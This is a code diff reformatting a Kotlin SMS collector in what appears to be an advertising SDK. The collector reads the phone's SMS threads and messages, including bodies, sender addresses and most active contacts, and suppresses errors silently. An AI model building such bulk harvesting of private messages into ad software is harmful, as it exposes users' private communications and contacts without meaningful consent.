@@ -6,7 +6,6 @@ import android.content.Context
 import android.content.pm.PackageManager
 import android.database.Cursor
 import android.net.Uri
-import android.os.Build
 import android.provider.Telephony
 import androidx.core.content.ContextCompat
 import com.seamlabs.admore.sdk.core.storage.ContentResolverUtils
@@ -14,13 +13,12 @@ import com.seamlabs.admore.sdk.data.source.local.model.SmsKeys
 import com.seamlabs.admore.sdk.domain.model.Permission
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
-import javax.inject.Inject
 
 /**
  * Optimized collector for SMS data with improved efficiency and comprehensive data collection.
  * Designed to work with the existing PermissionRequiredCollector base class.
  */
-class SmsCollector @Inject constructor(
+class SmsCollector(
     context: Context
 ) : PermissionRequiredCollector(
     context, setOf(Permission.SMS)
@@ -111,12 +109,7 @@ class SmsCollector @Inject constructor(
     private fun collectThreads(data: MutableMap<String, Any>) {
         try {
             val threads = queryContentResolver(
-                CONVERSATIONS_URI,
-                null,
-                null,
-                null,
-                null,
-                ::mapThreadData
+                CONVERSATIONS_URI, null, null, null, null, ::mapThreadData
             )
 
             data[SmsKeys.THREADS.toKey()] = threads
@@ -176,12 +169,7 @@ class SmsCollector @Inject constructor(
             } else {
                 val sortOrder = "${getColumnName(SmsKeys.MESSAGE_DATE)} DESC LIMIT $MAX_MESSAGES"
                 queryContentResolver(
-                    SMS_URI,
-                    null,
-                    null,
-                    null,
-                    sortOrder,
-                    ::mapMessageData
+                    SMS_URI, null, null, null, sortOrder, ::mapMessageData
                 )
             }
 
@@ -214,9 +202,9 @@ class SmsCollector @Inject constructor(
                 data[SmsKeys.MESSAGES.toKey()] as? List<Map<String, Any>> ?: emptyList()
 
             // Calculate message type distribution
-            val messageTypes = messagesList
-                .groupBy { it[SmsKeys.MESSAGE_TYPE.toKey()] as? Int ?: 0 }
-                .mapValues { it.value.size }
+            val messageTypes =
+                messagesList.groupBy { it[SmsKeys.MESSAGE_TYPE.toKey()] as? Int ?: 0 }
+                    .mapValues { it.value.size }
 
             data["message_type_counts"] = messageTypes
 
@@ -227,10 +215,9 @@ class SmsCollector @Inject constructor(
             val threadsList =
                 data[SmsKeys.THREADS.toKey()] as? List<Map<String, Any>> ?: emptyList()
             if (threadsList.isNotEmpty()) {
-                val activeThreads = threadsList
-                    .sortedByDescending { it[SmsKeys.THREAD_MESSAGE_COUNT.toKey()] as? Int ?: 0 }
-                    .take(10)
-                    .mapNotNull {
+                val activeThreads = threadsList.sortedByDescending {
+                        it[SmsKeys.THREAD_MESSAGE_COUNT.toKey()] as? Int ?: 0
+                    }.take(10).mapNotNull {
                         try {
                             mapOf(
                                 "thread_id" to (it[SmsKeys.THREAD_ID.toKey()] ?: 0),
@@ -330,29 +317,19 @@ class SmsCollector @Inject constructor(
 
         try {
             threadMap[SmsKeys.THREAD_ID.toKey()] = getColumnLongValue(
-                cursor,
-                getColumnName(SmsKeys.THREAD_ID),
-                0L
+                cursor, getColumnName(SmsKeys.THREAD_ID), 0L
             )
             threadMap[SmsKeys.THREAD_CONTACT.toKey()] = getColumnStringValue(
-                cursor,
-                getColumnName(SmsKeys.THREAD_CONTACT),
-                "Unknown"
+                cursor, getColumnName(SmsKeys.THREAD_CONTACT), "Unknown"
             )
             threadMap[SmsKeys.THREAD_MESSAGE_COUNT.toKey()] = getColumnIntValue(
-                cursor,
-                getColumnName(SmsKeys.THREAD_MESSAGE_COUNT),
-                0
+                cursor, getColumnName(SmsKeys.THREAD_MESSAGE_COUNT), 0
             )
             threadMap[SmsKeys.THREAD_SNIPPET.toKey()] = getColumnStringValue(
-                cursor,
-                getColumnName(SmsKeys.THREAD_SNIPPET),
-                ""
+                cursor, getColumnName(SmsKeys.THREAD_SNIPPET), ""
             )
             threadMap[SmsKeys.THREAD_DATE.toKey()] = getColumnLongValue(
-                cursor,
-                getColumnName(SmsKeys.THREAD_DATE),
-                0L
+                cursor, getColumnName(SmsKeys.THREAD_DATE), 0L
             )
         } catch (e: Exception) {
             // Silently handle error
@@ -373,59 +350,37 @@ class SmsCollector @Inject constructor(
 
         try {
             messageMap[SmsKeys.MESSAGE_ID.toKey()] = getColumnLongValue(
-                cursor,
-                getColumnName(SmsKeys.MESSAGE_ID),
-                0L
+                cursor, getColumnName(SmsKeys.MESSAGE_ID), 0L
             )
             messageMap[SmsKeys.MESSAGE_ADDRESS.toKey()] = getColumnStringValue(
-                cursor,
-                getColumnName(SmsKeys.MESSAGE_ADDRESS),
-                "Unknown"
+                cursor, getColumnName(SmsKeys.MESSAGE_ADDRESS), "Unknown"
             )
             messageMap[SmsKeys.MESSAGE_BODY.toKey()] = getColumnStringValue(
-                cursor,
-                getColumnName(SmsKeys.MESSAGE_BODY),
-                ""
+                cursor, getColumnName(SmsKeys.MESSAGE_BODY), ""
             )
             messageMap[SmsKeys.MESSAGE_DATE.toKey()] = getColumnLongValue(
-                cursor,
-                getColumnName(SmsKeys.MESSAGE_DATE),
-                0L
+                cursor, getColumnName(SmsKeys.MESSAGE_DATE), 0L
             )
             messageMap[SmsKeys.MESSAGE_TYPE.toKey()] = getColumnIntValue(
-                cursor,
-                getColumnName(SmsKeys.MESSAGE_TYPE),
-                0
+                cursor, getColumnName(SmsKeys.MESSAGE_TYPE), 0
             )
             messageMap[SmsKeys.MESSAGE_READ.toKey()] = getColumnIntValue(
-                cursor,
-                getColumnName(SmsKeys.MESSAGE_READ),
-                0
+                cursor, getColumnName(SmsKeys.MESSAGE_READ), 0
             ) == 1
             messageMap[SmsKeys.MESSAGE_SEEN.toKey()] = getColumnIntValue(
-                cursor,
-                getColumnName(SmsKeys.MESSAGE_SEEN),
-                0
+                cursor, getColumnName(SmsKeys.MESSAGE_SEEN), 0
             ) == 1
             messageMap[SmsKeys.MESSAGE_SUBJECT.toKey()] = getColumnStringValue(
-                cursor,
-                getColumnName(SmsKeys.MESSAGE_SUBJECT),
-                ""
+                cursor, getColumnName(SmsKeys.MESSAGE_SUBJECT), ""
             )
             messageMap[SmsKeys.MESSAGE_SERVICE_CENTER.toKey()] = getColumnStringValue(
-                cursor,
-                getColumnName(SmsKeys.MESSAGE_SERVICE_CENTER),
-                ""
+                cursor, getColumnName(SmsKeys.MESSAGE_SERVICE_CENTER), ""
             )
             messageMap[SmsKeys.MESSAGE_STATUS.toKey()] = getColumnIntValue(
-                cursor,
-                getColumnName(SmsKeys.MESSAGE_STATUS),
-                0
+                cursor, getColumnName(SmsKeys.MESSAGE_STATUS), 0
             )
             messageMap[SmsKeys.MESSAGE_THREAD_ID.toKey()] = getColumnLongValue(
-                cursor,
-                getColumnName(SmsKeys.MESSAGE_THREAD_ID),
-                0L
+                cursor, getColumnName(SmsKeys.MESSAGE_THREAD_ID), 0L
             )
         } catch (e: Exception) {
             // Silently handle error
@@ -457,9 +412,7 @@ class SmsCollector @Inject constructor(
      * Safely get string value from cursor
      */
     private fun getColumnStringValue(
-        cursor: Cursor,
-        columnName: String,
-        defaultValue: String
+        cursor: Cursor, columnName: String, defaultValue: String
     ): String {
         return try {
             val columnIndex = cursor.getColumnIndex(columnName)
